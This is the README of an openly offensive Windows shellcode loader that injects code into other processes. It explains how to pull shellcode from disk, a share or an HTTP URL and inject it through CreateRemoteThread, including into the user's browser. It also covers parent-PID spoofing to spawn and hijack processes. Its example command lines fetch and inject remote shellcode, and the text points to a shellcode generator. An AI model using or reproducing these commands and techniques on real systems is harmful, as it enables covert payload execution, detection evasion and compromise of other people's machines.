# ProcessInjection

This fork of process injection allows for dynamically pulling shellcode (in bin or base64 format) from either the disk or over HTTP as opposed to embedding the shellcode in the binary.

Additional Techniques yoinked from 3xpl01tc0d3r: https://github.com/3xpl01tc0d3r/ProcessInjection/blob/master/ProcessInjection/Program.cs

## Usage

```
Runner Help:
    Usage: Runner.exe [options]
    Example: Runner.exe targ=http://fun/targ.bin form=bin meth=simple pid=1000
    Example: Runner.exe targ=C:\path\to\targ.b64 form=b64 meth=simple pid=self
    Example: Runner.exe targ=\\some\share\path\to\targ.b64 form=b64 meth=simple pid=explorer
    Example: Runner.exe targ=https://fun/targ.bin parent=1000 spawn=C:\path\to\custom.exe
    Example: Runner.exe targ=https://fun/targ.bin parent=explorer spawn=notepad.exe
Defaults:
    meth => simple
    form => bin
```

## Target and Format

The `targ` argument can point to a URL or path on disk. URLs must start with http:// or https://. This file should contain your shellcode. .Net shellcode can be generated via Donut by TheWover.

The `form` argument tells the runner whether the shellcode is in "binary" format (default) or "base64. Valid values are "bin", "binary", "base64", and "b64". If encoded, the runner will decode it.

## Injection Techniques

The `meth` argument tells the runner what technique to use for injection. Right now, only "simple" injection is supported (default) via CreateRemoteThread.

## Parent Spoofing vs PID

You can either target a live process (PID / live mode) to inject into or you can use parent spoofing. PID mode requires the use of the `pid` arugment while parent spoofing requires both `parent` and `spawn`.

### PID / Live Mode

The `pid` value accepts a valid PID, a program to search for (explorer.exe/notepad.exe), or "self". When searching, the pid is resolved from the current session so the process needs to be in the same session. For self, the runner will just inject into itself and wait forever. There is an additional alias called `browser` that attempts to first inject into the user's default browser and then blindly checks for running chrome and IE instances.

### Parent Mode

The `parent` argument can be either a valid running PID or a program name (explorer/program.exe). When searching for the program name, a running PID for that program must exist in the same session.

The `spawn` argument tells the runner which program to spawn and inject into. It can either be a fully qualified path to an EXE or a basename like "explorer.exe". The runner will search the \$PATH environment variable for the executable. The spawn argument also has a browser alias that looks for common brower executables.

## Known Issues

- cmd.exe may not work with spawn.

### References

- .Net ShellCode https://github.com/TheWover/donut
- Parent Spoofing: https://github.com/3xpl01tc0d3r/ProcessInjection/blob/master/ProcessInjection/Program.cs

## Todos:

- Process hollowing
- APC Queue
- Clean up Win32
- Simple targets and keys
- Parseable targets via regex
